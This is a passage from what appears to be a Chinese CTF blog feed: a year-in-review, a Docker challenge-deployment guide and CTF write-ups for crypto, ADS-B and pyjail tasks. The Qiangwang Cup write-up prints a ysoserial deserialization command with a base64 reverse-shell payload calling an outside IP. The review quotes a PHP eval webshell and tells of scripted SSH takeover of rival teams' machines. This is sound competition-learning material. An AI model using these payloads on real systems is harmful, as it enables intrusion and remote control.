class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$db_name</span> = <span class="hljs-string">&quot;kctf2024&quot;</span>;<br><span class="hljs-variable">$_A_p_1_k_3_Y_</span> = <span class="hljs-string">&quot;6eea9135-2801-4560-b44c-f297b5f46f2f&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>在<code>tcp.stream eq 1532</code> 得到用户名<br><img src="/mdimg/knight2024/30.png"><br><code>KCTF&#123;db_user_kctf2024&#125;</code></p><h3 id="API-Key"><a href="#API-Key" class="headerlink" title="API Key"></a>API Key</h3><p>What’s the API Key?<br>Flag Format: KCTF{API-KEY}<br>在<code>/models/db.php</code><br><code>$_A_p_1_k_3_Y_ = &quot;6eea9135-2801-4560-b44c-f297b5f46f2f&quot;;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023年终总结</title>
    <link href="/2023/12/31/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/31/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>不知不觉，又是一年。上一年没认真总结，今年就随便写点什么吧。</p><p>回首初入大学接触到CTF，恍惚如昨日。人生不如意之十有八九，命运使然，高考失利梦碎，但也庆幸，若无此经历，或许我一辈子都接触不到CTF和安全。</p><p>  CTF之于我的初印象，就是好玩。还记得作为萌新之时，最先接触的是misc，还记得跟着搜索引擎和靶场，安装了一堆工具，还有安装kali、配置环境的各种报错，接触到各种奇奇怪怪的编码。在此之前，作为一名电脑小白，这无疑极大的勾起了我的兴趣。第一次打的比赛是西电的moectf2022，题目很好很有趣，多是引导性的题目，可以帮助快速入门。（ps：今年的moectf2023貌似过于上强度了）印象最深刻的是改成绩的游戏题，第一次通过控制台和js代码来改分数拿到flag，成就感满满。</p><p> 第一次知道一句话木马    <code>&lt;?php @eval($_POST[1]);?&gt;</code> 于我而言，刷新了我的想象，在此之前木马病毒对我来说是一个十分抽象，甚至无法想象出来是什么的东西。或许从这时开始，我决定要学习web方向了。</p><p>moectf2022虽然最后也没拿到什么好成绩，但是体验肥肠好，西电是我的白月光QAQ</p><p><img src="/mdimg/2023/a.jpg"></p><p>moectf2023也算圆满了 -&gt;&gt;<a href="https://j-0k3r.github.io/2023/10/16/moectf2023/">moectf2023 wp - J_0k3r (j-0k3r.github.io)</a></p><p>第一次团队赛ISCTF2022，misc赛（  web没出多少，出了一堆misc</p><p>跟m神组队，带我飞飞飞</p><p>最后好像是新生赛道第五，奖励了打一次awd ok啊完全不会，刚装好xshell就被人改了ssh密码删站了，也是直接下班</p><p><img src="/mdimg/2023/a.png"></p><p>unctf2022</p><p>最废寝忘食的一集，有前面做一堆misc的铺垫，此时打ctf的状态可谓是走火入魔，还记得最后快结束那晚因为被莫神超了，战斗到凌晨3点。</p><p>此时拿到flag之于我可谓是无比巨大的成就感，以至于整个人都像发颠一样没日没夜的打。</p><p><img src="/mdimg/2023/b.png"></p><p>最后也是通过面试进入hor1zon（此时还没队名</p><p>以校内第一拿到了g0at酱的八伯大洋，美滋滋</p><p>然后最后通过各种线上比赛和水群，和队u们熟络起来了</p><p>此时g0at队长是一个Π批（我也是） 索性就拿地平线来当队名了</p><p>最后也是请了广美高材生uu画了logo（十分感谢.jpg）</p><p><img src="/mdimg/2023/g.png"></p><p>可能因为前面比赛的原因吧，misc学的比较多，web挺少，感觉有点偏离阵线了。狠狠反思</p><h3 id="new-2023-‘new-begin’"><a href="#new-2023-‘new-begin’" class="headerlink" title="new 2023(‘new begin’)"></a>new 2023(‘new begin’)</h3><p>新年第一站 西湖论剑 太菜了没输出0.0  遗憾离场 </p><p>后面陆陆续续打了山石冬令营，各种国际赛，春秋杯，pwnhub</p><p>此时的我还是没意识到问题，web还是不重视………………..</p><p>到4月，命运的齿轮开始运转</p><p> 2023这一年，参加了许多的线下赛。</p><h4 id="this-gt-2023-4-’First-offline-competition’"><a href="#this-gt-2023-4-’First-offline-competition’" class="headerlink" title="this-&gt;2023.4=’First offline competition’"></a>this-&gt;2023.4=’First offline competition’</h4><p> 参加了福州的长城杯，第一次面基g0at 后面也去看了数博会<br><img src="/mdimg/2023/1.jpg"></p><p><img src="/mdimg/2023/c.jpg"></p><p>此时入门CTF半年多，而决赛的渗透对于我来说，是全新的体验<br>由于没接触过渗透，对内网的东西都很陌生，像fscan nmap的一些工具都不认识 而且kali不知道为啥连不上网工具全无<br>拿到靶机也没有思路，awvs也没装，一些漏洞库也没准备  ，也是第一次打线下，紧张是难免的</p><p>robots.txt都没差点没搞出来</p><p>遗憾是没吃到啥特色菜（比赛场地太偏了0.0.</p><h4 id="this-gt-2023-6"><a href="#this-gt-2023-6" class="headerlink" title="this-&gt;2023.6"></a>this-&gt;2023.6</h4><p>上海市赛  再次来到上海，不过这次是来比赛<br><img src="/mdimg/2023/2.jpg"><br>不出意外 这次是第一次打awd<br>由于条件有限，只在理论层面看过awd 而没实操过<br>差点被打成筛子 通防不给上 上了就check 不过 根本防不住 好在队里有web✌， 也是痛失二等</p><p>b站总部进不去，只能在外观摩，米哈游总部工作日不开放，遗憾离场</p><p>也是感受了一波南京路的霓虹世界</p><p><img src="/mdimg/2023/d.jpg"></p><h4 id="this-gt-2023-6-下旬"><a href="#this-gt-2023-6-下旬" class="headerlink" title="this-&gt;2023.6 .下旬"></a>this-&gt;2023.6 .下旬</h4><p> ciscn华南分区赛<br><img src="/mdimg/2023/3.jpg"><br>完成成就 卧铺12小时–&gt;桂林<br>第一次打awdp<br>awdp 我感觉更趋向于CTF，就是先把靶机打穿，知道了漏洞的点，然后就可以对应的加固<br>web一开始上了通防，但没用 ，靶机打穿了一个 但是不会修，几轮check都没加固好<br>唉 ~ 遗憾离场无缘决赛</p><p>每天都下雨（拖鞋出动！）</p><p>桂林米粉好次！</p><h4 id="this-gt-2023-9"><a href="#this-gt-2023-9" class="headerlink" title="this-&gt;2023.9"></a>this-&gt;2023.9</h4><p> 羊城杯<br><img src="/mdimg/2023/4.jpg"><br>ctf + awdp<br>只去了两个人 打不动力<br>这次第二次打awdp，有了点经验，fix加固了两个，break有一题ssti，kali环境崩了工具用不了，没咋做ssti太菜了手注注不出来<br>双拳难敌四手 优胜奖离场</p><h4 id="this-gt-2023-9-中旬"><a href="#this-gt-2023-9-中旬" class="headerlink" title="this-&gt;2023.9.中旬"></a>this-&gt;2023.9.中旬</h4><p>贵阳蓝帽半决赛<br><img src="/mdimg/2023/5.jpg"><br>ctf + 取证<br>取证平时也做不少，而且拿到了火眼取证大师和奇安信的工具 没啥好说的，就是梭哈<br>有个题本来是对的最后给改错了…………<br>这取证的答案很难崩 格式限制死了 因为大小写 几题错了 很无语 ，但是有人取证满分 我不好说</p><p>折耳根接受不了0.0.</p><h4 id="this-gt-2023-10-月末"><a href="#this-gt-2023-10-月末" class="headerlink" title="this-&gt;2023.10 月末"></a>this-&gt;2023.10 月末</h4><p>北京蓝帽总决赛<br>离家最远的一集 也是最难崩的一级<br><img src="/mdimg/2023/6.jpg"><br>真实菠菜渗透<br>一开始菠菜扫二维码 存了qr_research 好像拿了个三血<br>apk逆向 只找到一个站 一直打不进去 ，提示指明了漏洞也没打进去<br>最后几分钟才发现 别的站 要自己扫网段扫出来………………..<br>最后只扫出来一个站交上去，别的扫出来了 来不及交了 难崩 又成小丑了</p><p>去了故宫，非常震撼，很大，根本逛不完</p><p><img src="/mdimg/2023/e.jpg"></p><p>涮肉好吃！(老马全责的一集)</p><p><img src="/mdimg/2023/f.jpg"></p><h4 id="this-gt-2023-11"><a href="#this-gt-2023-11" class="headerlink" title="this-&gt;2023.11"></a>this-&gt;2023.11</h4><p>武汉 金砖<br>最快乐的一集<br><img src="/mdimg/2023/7.jpg"><br>ctf + awdp<br>笑死 全部人的靶机ssh密码都一样<br>一开始忘了改密码，给别人连上去改了<br>最难崩的是重置靶机后的ssh密码还是那个<br>后面写了脚本直接 遍历连每个人的靶机ssh 只要有人重置就连上去改密码直接读flag然后删站<br>最快乐的一集，写好脚本直接挂着睡觉了<br>最后也是靠ctf高分 拿了本科组亚军  </p><p>这下真首银摄金了！</p><p><img src="/mdimg/2023/h.jpg"></p><h4 id="同日"><a href="#同日" class="headerlink" title="同日"></a>同日</h4><p>鹏城杯，连夜赶场，体验了鹏城实验室伙食<br><img src="/mdimg/2023/8.jpg"><br>实景渗透很好 根本看不懂捏。</p><p>打了挺多线下赛，结果大都不尽如人意。<br>一句话总结：菜就多练</p><p>最大的收获：</p><p>  对于非网安专业的我来说，最大的收获就是在自学中锻炼出来的善于利用搜索引擎的能力。到今天，已然过去一年了，我能清楚的感受到对比于身边专注于课内理论学习而无心于竞赛和自学的人来说，我能够自然的通过互联网找到答案。</p><p>到最近，越来越感觉热情和经历要被学校课程磨光了 感觉课间给我的零碎的时间 我很难静下心来去专研题目<br>而且学到现在 还是有点迷茫 感觉什么都要学 什么都没学 但不知道学什么 效率也不高 也没个清楚的路线。</p><p>做web感觉就是，很多东西都没见过，没接触过。没有一个比较清晰的思路，都是盲打。<br>归根到底就是经验少，刷题少了。应该纠正方向，狠狠沉淀web了！</p><p>写在最后：</p><p>不管怎么说，一年过去了，多多少少也是收获。那就存个档吧，成败与否皆是过往，新的一年，开新主线，重拾热情，拨开迷雾，继续进步！hor1zon蒸蒸日上！</p><p>2023.12.31 于实验室工位上</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>小记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker 部署ctf php动态靶机</title>
    <link href="/2023/12/25/docker%20%E9%83%A8%E7%BD%B2ctf%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA/"/>
    <url>/2023/12/25/docker%20%E9%83%A8%E7%BD%B2ctf%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>本文在ubuntu20.04 下进行，且Linux安装，换源以及相关工具和操作已经准备完毕</p><h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><p>首先先进入根目录<br><code>cd /</code><br>然后进入root //注意最好不要退出root，为了避免你们出错，我命令都加了sudo，如果已一直是su了就可以不用<br><code>su</code><br>然后<br><code>curl -fsSL [https://get.docker.com](https://get.docker.com) | bash -s docker --mirror Aliyun</code><br>然后 <code>docker images</code><br><img src="/note/docker/1.png"><br>如图则为安装成功</p><h3 id="配置dockerhub加速"><a href="#配置dockerhub加速" class="headerlink" title="配置dockerhub加速"></a>配置dockerhub加速</h3><p><a href="https://www.aliyun.com/">https://www.aliyun.com/</a><br>注册一个账号<br>然后在搜索框搜“容器”得到以下界面<br><img src="/note/docker/2.png"><br>然后<br><img src="/note/docker/3.png"><br>然后<br><img src="/note/docker/4.png"><br><img src="/note/docker/5.png"><br>然后输入<code>docker info</code><br>出现<img src="/note/docker/6.png">则为成功</p><h3 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h3><p><code>sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-</code>uname -s<code>-</code>uname -m<code> -o /usr/local/bin/docker-compose</code><br>或者<br><code>sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-</code>uname -s<code>-</code>uname -m<code> -o /usr/local/bin/docker-compose</code><br>然后授权<br><code>sudo chmod +x /usr/local/bin/docker-compose</code><br>然后输入检查<br><code>docker-compose --version</code><br><img src="/note/docker/7.png"><br>返回版本就成功了捏</p><h3 id="dockerhub"><a href="#dockerhub" class="headerlink" title="dockerhub"></a>dockerhub</h3><p><a href="https://hub.docker.com/">https://hub.docker.com/</a><br>注册一个账号<br>然后在ubuntu登录<br><code>sudo docker login</code><br>然后把你的题目文件夹丢进去虚拟机<br>以下以一个web题为例子<br>进入到你题目文件夹<br><img src="/note/docker/8.png"><br>源码和sh放在同一个目录下，Dockerfile放在与src目录平行的位置<br><img src="/note/docker/9.png"><br>Dockerfile：<br>内容如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73      //基础镜像<br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Author=<span class="hljs-string">&quot;J_0k3r&quot;</span>                               //作者</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Blog=<span class="hljs-string">&quot;https://j-0k3r.github.io/&quot;</span>        //博客</span><br>//上面这两行可有可无<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src /var/www/html              //docker内执行的操作，把src的复制到后面的路径中</span><br></code></pre></td></tr></table></figure><p>flag.sh：<br>内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#!/bin/sh#必需的东西没什么好讲的</span><br>sed -i <span class="hljs-string">&quot;s/flag&#123;testflag&#125;/$GZCTF_FLAG/&quot;</span> /var/www/html/index.php <span class="hljs-comment">#使用平台的动态flag替换index.php中的flag，这里我使用的平台为GZCTF，因此动态flag环境变量为$GZCTF_FLAG，其他平台一般为$FLAG</span><br>export GZCTF_FLAG=<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">#这句应该是对接平台的动态flag接口</span><br></code></pre></td></tr></table></figure><p>使用时请务必把中文注释都删掉<br>上面的都准备好之后<br>开始本地搭镜像并且传到dockerhub<br><img src="/note/docker/10.png"><br>先在dockerhub建好，再本地搭<br><code>sudo docker build -t 用户名/题目名 .</code><br>用户名是你dockerhub登录的用户名，题目名要和你在dockerhub上面的一样（命令后面的.不要忘了<br><img src="/note/docker/11.png"><br>这样就是成功了<br>然后push到dockerhub<br><code>sudo docker push 用户名/题目名</code><br><img src="/note/docker/12.png"><br>然后就可以去dockerhub看看<br><img src="/note/docker/13.png"><br>然后就是测试题目了<br>这里就不展示测试了<br>到这，题目docker就搞定了</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2023 wp</title>
    <link href="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/"/>
    <url>/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="队伍信息"><a href="#队伍信息" class="headerlink" title="队伍信息"></a>队伍信息</h2><p><img src="/mdimg/qwb2023/1.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h3><p>发现是grpc服务<br>用postman的grpc模式发包<br>ysoserial生成cc7<br>反弹shell<br><img src="/mdimg/qwb2023/2.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsCollections7 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzguMTM1LjY3LzgwMDEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-title">|base64 -w0 &gt;2.txt</span><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="discrete-log"><a href="#discrete-log" class="headerlink" title="discrete_log"></a>discrete_log</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br>flag = <span class="hljs-string">&#x27;flag&#123;d3b07b0d416ebb&#125;&#x27;</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) &lt;= <span class="hljs-number">45</span><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br><span class="hljs-keyword">assert</span> flag.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br><br>m = bytes_to_long(pad(flag.encode(), <span class="hljs-number">128</span>))<br><br>p = <span class="hljs-number">0xf6e82946a9e7657cebcd14018a314a33c48b80552169f3069923d49c301f8dbfc6a1ca82902fc99a9e8aff92cef927e8695baeba694ad79b309af3b6a190514cb6bfa98bbda651f9dc8f80d8490a47e8b7b22ba32dd5f24fd7ee058b4f6659726b9ac50c8a7f97c3c4a48f830bc2767a15c16fe28a9b9f4ca3949ab6eb2e53c3</span><br>g = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">assert</span> m &lt; (p - <span class="hljs-number">1</span>)<br><br>c = <span class="hljs-built_in">pow</span>(g, m, p)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>&quot;</span>, file=f)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;g = &#125;</span>&quot;</span>, file=f)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;c = &#125;</span>&quot;</span>, file=f)<br></code></pre></td></tr></table></figure><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>DLP问题，p=2q+1,一开始看这个p作为安全素数，怎么能分解，然后查到了几个帖子。<br><a href="https://crypto.stackexchange.com/q/2990/109345">How can I solve the discrete logarithm modulo 2q+1 if I can solve it in the subgroup of order q?</a><br><a href="https://crypto.stackexchange.com/q/46826/109345">On getting beyond LSB in discrete log</a><br>第一个告诉我们安全素数可以从Zp群降到Zq群，其实就是方便分解也没啥特别了。第二个贴说了一个 $r^{x}=hg^{-x_0}\bmod p$ 的办法，结合给出的</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span> = <span class="hljs-string">&#x27;flag&#123;d3b07b0d416ebb&#125;&#x27;</span><br><br><span class="hljs-built_in">assert</span> len(<span class="hljs-built_in">flag</span>) &lt;= <span class="hljs-number">45</span><br><span class="hljs-built_in">assert</span> <span class="hljs-built_in">flag</span>.startswith(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br><span class="hljs-built_in">assert</span> <span class="hljs-built_in">flag</span>.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可以知道去掉flag头和flag尾，还有pad，字符串应该不大，选择大概在10~20左右进行爆破，(其实是一个一个试。。。就是中间人相遇的问题了，硬爆。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">p</span> = <br>g = <span class="hljs-number">5</span><br><span class="hljs-keyword">c</span> = <br><br>q = (<span class="hljs-keyword">p</span> - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br><br>from Crypto.Util.<span class="hljs-keyword">number</span> import *<br>from Crypto.Util.Padding import pad<br>from tqdm import tqdm<br>from itertools import product<br><br>i = <span class="hljs-number">12</span> # 调一次<span class="hljs-number">10</span>多分钟，不会多线程真麻了<br><br>tmpf = bytes_to_long(pad(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;flag&#123;&#x27;</span> + <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span> * i + <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-number">128</span>))<br>lift = <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, (<span class="hljs-number">128</span> - i - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;flag&#123;&#125;&#x27;</span>) + <span class="hljs-number">1</span>))<br><span class="hljs-keyword">c</span>= <span class="hljs-keyword">c</span>* <span class="hljs-built_in">pow</span>(g, -tmpf, <span class="hljs-keyword">p</span>) % <span class="hljs-keyword">p</span><br><span class="hljs-keyword">c</span>= <span class="hljs-built_in">pow</span>(<span class="hljs-keyword">c</span>, inverse(lift, q), <span class="hljs-keyword">p</span>)<br><br>table = [hex(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>dic = dict()<br>hg, <span class="hljs-keyword">lg</span> = <span class="hljs-built_in">pow</span>(g, <span class="hljs-number">256</span>**(i//<span class="hljs-number">2</span>), <span class="hljs-keyword">p</span>), g<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">pre</span> in tqdm(product(table, <span class="hljs-built_in">repeat</span>=i//<span class="hljs-number">2</span>)):<br>    <span class="hljs-keyword">pre</span> = bytes_to_long(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-keyword">pre</span>).encode())<br>    now = <span class="hljs-keyword">c</span>* <span class="hljs-built_in">pow</span>(hg, -<span class="hljs-keyword">pre</span>, <span class="hljs-keyword">p</span>) % <span class="hljs-keyword">p</span><br>    dic[now] = <span class="hljs-keyword">pre</span><br><br><span class="hljs-keyword">for</span> suf in tqdm(product(table, <span class="hljs-built_in">repeat</span>=i//<span class="hljs-number">2</span>)):<br>    suf = bytes_to_long(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(suf).encode())<br>    now = <span class="hljs-built_in">pow</span>(<span class="hljs-keyword">lg</span>, suf, <span class="hljs-keyword">p</span>)<br>    <span class="hljs-keyword">if</span> now in dic:<br>        <span class="hljs-keyword">print</span>(dic[now])<br>        <span class="hljs-keyword">print</span>(suf)<br>        <span class="hljs-keyword">print</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;flag&#123;&#x27;</span> + long_to_bytes(dic[now]) + long_to_bytes(suf) + <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>b’flag{61e8007dd65f}’</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="谍影重重2-0"><a href="#谍影重重2-0" class="headerlink" title="谍影重重2.0"></a>谍影重重2.0</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>题目内容：<br>小明是某间谍组织的一员，他终日监听着我国某重点军事基地的飞行动态，妄图通过分析参数找到我国飞的最快的飞机。我国费尽千辛万苦抓住了他，并在他的电脑上找到了一段他监听的信息，请分析出这段信息中飞的最快的飞机。<br>格式为flag{md5(ICAO CODE of the fastest plane)}</p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>由提示知是飞机流量<br><code>https://mode-s.org/decode/content/ads-b/1-basics.html</code><br>导出有tcp.payload字段的流 为1.pcapng<br><img src="/mdimg/qwb2023/3.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tshark -r 1.pcapng -T fields -e tcp.payload  | sed &#x27;s/1a33ffffffffffff.\&#123;2\&#125;//&#x27;  &gt; data.txt<br>sed &#x27;s/1a32ffffffffffff.\&#123;2\&#125;//&#x27; data.txt<br></code></pre></td></tr></table></figure><p>提取数据<br><code>pip install pyModeS</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyModeS <span class="hljs-keyword">as</span> pms<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lines:<br>    pms.tell(i)<br></code></pre></td></tr></table></figure><p><img src="/mdimg/qwb2023/4.png"><br>ICAO 要大写</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">79A05E</span><br><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">4</span>cf6729b9bc05686a79c1620b0b1967b&#125;<br></code></pre></td></tr></table></figure><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>题目内容：<br>你能否能帮助她绕过filter呢？是时候拿出真本事！提示：本题需要一定的成功率，如果你认为你的payload能够工作，请多尝试几遍！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> code, os, subprocess<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blacklist_fun_callback</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>pty.spawn = blacklist_fun_callback<br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interact = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br><span class="hljs-built_in">vars</span> = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br><span class="hljs-built_in">getattr</span> 